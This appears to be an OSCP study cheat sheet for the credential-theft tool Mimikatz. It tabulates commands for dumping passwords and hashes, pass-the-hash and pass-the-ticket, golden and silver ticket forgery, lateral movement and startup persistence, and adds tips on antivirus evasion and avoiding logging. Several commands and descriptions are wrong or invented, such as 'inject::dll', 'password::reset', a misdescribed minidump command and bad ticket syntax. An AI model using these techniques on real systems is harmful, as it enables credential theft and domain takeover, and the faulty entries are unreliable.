| **Category** | **Purpose** | **Command Examples** | **Notes** |
| --- | --- | --- | --- |
| **Basic Command** | Run Mimikatz and check for available modules | `mimikatz` | Running `mimikatz` without arguments opens the Mimikatz command prompt, from which you can run various commands. |
| **Check for Privileges** | Display current user’s privileges | `privilege::debug` | Needed to elevate privileges if not already running as SYSTEM or admin. Some commands require the `debug` privilege. |
| **Dumping Password Hashes** | Dump hashes from local SAM (Security Account Manager) | `sekurlsa::logonpasswords` | This command lists all the cleartext passwords, NTLM hashes, and Kerberos tickets of the current user. |
| **Dumping Hashes with LSASS** | Dump hashes from LSASS (Local Security Authority Subsystem Service) | `sekurlsa::ekeys` | Extracts cached credentials from memory, similar to `logonpasswords`. |
| **Pass-the-Hash (PTH)** | Use NTLM hash to authenticate without knowing the password | `sekurlsa::pth /user:Administrator /domain:WORKGROUP /sid:S-1-5-32-544 /rc4:9447fbc83974323e3fc463129ef70631` | Allows login using hashes instead of plaintext passwords. Use this to impersonate another user. The SID and hash are required. |
| **Extracting Tickets** | Dump Kerberos tickets from the memory | `kerberos::list` | Displays Kerberos tickets stored in memory. These are used in ticket forwarding or pass-the-ticket (PTT) attacks. |
| **Pass-the-Ticket (PTT)** | Use a Kerberos ticket to authenticate as another user | `kerberos::ptt <ticketfile>` | Takes a saved Kerberos ticket (TGT) and injects it into the current session. Useful for impersonating a user without needing a password. |
| **LSASS Memory Dump** | Dump the LSASS process memory to get credentials | `sekurlsa::minidump C:\\lsass.dmp` | Dumps the LSASS process memory to a `.dmp` file, which can later be analyzed to retrieve passwords, hashes, and other sensitive information. |
| **Injecting DLL** | Inject a malicious DLL into another process | `inject::dll <path_to_dll> <process_id>` | Can be used to escalate privileges by injecting a malicious DLL into a vulnerable process (e.g., `explorer.exe`). |
| **Golden Ticket Attack** | Create and use a forged Kerberos ticket | `kerberos::golden /user:Administrator /domain:workgroup.local /sid:S-1-5-21-1550057236-2023182416-1374000000` | Golden Tickets are forged Kerberos tickets with arbitrary privileges, allowing persistence and access to domain resources indefinitely until the ticket expires. |
| **Silver Ticket Attack** | Forge a Kerberos Service Ticket | `kerberos::tgt /user:Administrator /rc4:<hash> /domain:workgroup.local /sid:S-1-5-21-1550057236-2023182416-1374000000` | Silver Tickets are service tickets (TGS) that can be used to authenticate to specific services like SMB or RDP without needing a full Golden Ticket. |
| **Dumping Credentials** | Dump stored credentials from the system | `sekurlsa::logonpasswords` | Displays usernames, passwords, and NTLM hashes from logged-in users. |
| **Dumping Cached Credentials** | Dump cached credentials on a local machine | `lsadump::cache` | Displays cached login credentials stored on a Windows machine. These are often useful for offline cracking. |
| **Overpass-the-Hash (Pass the Key)** | Use an NTLM hash to obtain a TGT (Ticket Granting Ticket) without a password | `kerberos::ptt /user:Administrator /rc4:<NTLM_hash>` | Obtain a TGT (Kerberos Ticket) using just an NTLM hash, useful for Kerberos-based authentication. |
| **Kerberos Ticket Renewal** | Renew Kerberos TGT tickets | `kerberos::renew` | Allows attackers to refresh Kerberos tickets that are about to expire. |
| **Dumping Domain Trusts** | Dump information about domain trusts | `lsadump::trusts` | Useful for gathering information about trust relationships between domains, which can be used to pivot within networks. |
| **Get TGT** | Obtain a Ticket Granting Ticket (TGT) for a user | `kerberos::tgt /user:<user> /domain:<domain> /rc4:<NTLM_hash>` | Generates a Kerberos ticket granting access to the domain. Useful for lateral movement in a domain environment. |
| **Resetting Passwords** | Reset the password of a domain user | `password::reset /user:<username> /domain:<domain> /newpassword:<new_password>` | This command allows you to reset the password of a user, essentially locking them out and controlling their account. |
| **Dumping LSA Secrets** | Dump Local Security Authority secrets | `lsadump::secrets` | Dumps all the secrets stored in the Local Security Authority (LSA) database, which could include service account passwords, machine account passwords, etc. |
| **Pivoting** | Move laterally through a network | `mimikatz.exe /user:<target_user> /rc4:<NTLM_hash> /domain:<domain>` | Use credentials obtained from one machine to move laterally to other machines in the network. This command is used to pass the hash or credentials to new machines. |
| **Persistence** | Setup persistence with Mimikatz | `schtasks /create /tn <TaskName> /tr "cmd.exe /c mimikatz.exe" /sc onstart` | Useful for setting up persistence after obtaining initial access. Configures a scheduled task to execute Mimikatz automatically when the system starts. |

### Side Notes from Studying

- **Privilege Escalation:** Many Mimikatz features require administrative or SYSTEM privileges. Use techniques like **`privilege::debug`** to elevate.
- **Persistence & Lateral Movement:** After gaining initial access, Mimikatz can help you maintain control (e.g., **Golden Tickets**, **Silver Tickets**) and move laterally through a network.
- **Antivirus Evasion:** Mimikatz is a powerful tool, but it’s often detected by AV software. Use encoding, obfuscation, or injection techniques to bypass AV defenses.
- **Logging and Detection:** Be cautious, as Mimikatz actions are often logged (especially if you use the `kerberos::golden` attack). Use it in areas of the network where logging might not be as strict (e.g., local systems).

### Misc Tips

- **Run Mimikatz on a Compromised Host:** After compromising a Windows machine, run `mimikatz` to extract credentials and escalate privileges.
- **Test with Limited Credentials:** Test the impact of dumping credentials from non-administrative accounts and see how it affects lateral movement in the exam environment.
- **Practice the Pass-the-Hash and Pass-the-Ticket Techniques:** Mimikatz is essential for these techniques, which are key OSCP skills for lateral movement.
